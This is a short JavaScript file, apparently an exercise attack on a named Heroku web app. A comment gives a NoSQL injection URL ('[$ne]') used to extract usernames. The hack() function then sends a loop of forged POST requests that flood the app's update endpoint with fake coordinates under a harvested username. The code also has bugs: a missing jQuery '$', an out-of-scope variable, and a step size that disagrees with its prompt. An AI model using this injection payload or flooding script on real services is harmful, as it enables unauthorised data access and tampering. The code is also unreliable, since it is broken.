function ask_for_hacks() {
	var hack = document.getElementById("hack");

	hack.innerHTML = "<h2 id='hack'>Click Me to Try This Hack</h2>";
	("#hack").on("click", function(){
		var input = prompt("Enter a lattitude. We'll iterate from your input to 90, incrementing by 0.001. All of this will be added to the database!");
	});
	if(input != null){
		hack(input)
	}
}

function hack(){
	var lng = 0.000;
	var lat = 0;
	var username = "JANET"; // some username we found using https://hans-moleman.herokuapp.com/vehicle.json?username[$ne]=anytexthere

	while(lat < 90.0){
		var request = new XMLHttpRequest();
		request.open("POST", "https://hans-moleman.herokuapp.com/update");
		request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		request.send("username=" + username + "&lat=" + lat + "&lng=" + lng);
		lat += 0.01;
	}
}